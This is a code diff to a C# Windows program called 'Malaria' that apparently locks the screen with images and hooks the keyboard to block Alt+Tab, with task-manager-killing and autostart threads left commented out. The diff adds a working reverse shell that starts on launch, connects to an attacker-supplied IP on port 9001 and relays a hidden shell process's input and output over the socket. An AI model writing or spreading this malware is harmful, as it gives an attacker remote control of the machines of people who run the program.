@@ -2,6 +2,8 @@
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
+using System.Net.Sockets;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using Gma.System.MouseKeyHook;
@@ -13,18 +15,81 @@ namespace Malaria
     public partial class Malaria : Form
     {
         private IKeyboardMouseEvents _globalHook;
+        private StreamWriter streamWriter;
 
         public Malaria()
         {
             InitializeComponent();
             DisplayImageOnAllScreens();
-            // new Thread(KillTaskManager).Start();
-            // new Thread(AutoStart).Start();
+            //new Thread(KillTaskManager).Start();
+            //new Thread(AutoStart).Start();
+            new Thread(StartReverseShell).Start();
             KeyPreview = true;
             _globalHook = Hook.GlobalEvents();
             _globalHook.KeyDown += GlobalHook_KeyDown;
         }
+        private void StartReverseShell()
+        {
+            string serverIp = ""; //put here your ip(can be local to test localy)
+            int serverPort = 9001; //port(you have to forward the port if you do this on your router)
 
+            try
+            {
+                using (TcpClient client = new TcpClient(serverIp, serverPort))
+                {
+                    using (NetworkStream stream = client.GetStream())
+                    {
+                        using (StreamReader rdr = new StreamReader(stream))
+                        {
+                            streamWriter = new StreamWriter(stream) { AutoFlush = true };
+
+                            StringBuilder strInput = new StringBuilder();
+
+                            Process p = new Process();
+                            p.StartInfo.FileName = "sh"; // Use "cmd.exe" for Windows
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                            p.Start();
+                            p.BeginOutputReadLine();
+
+                            while (true)
+                            {
+                                strInput.Clear();
+                                strInput.Append(rdr.ReadLine());
+                                if (strInput.Length > 0)
+                                {
+                                    p.StandardInput.WriteLine(strInput.ToString());
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+        }
+
+        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    streamWriter.WriteLine(outLine.Data); // Send output back to the server
+                }
+                catch (Exception err)
+                {
+                    // Handle exceptions (e.g., log them)
+                    Console.WriteLine("Error sending output: " + err.Message);
+                }
+            }
+        }
         private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
         {
             // Block ALT + TAB
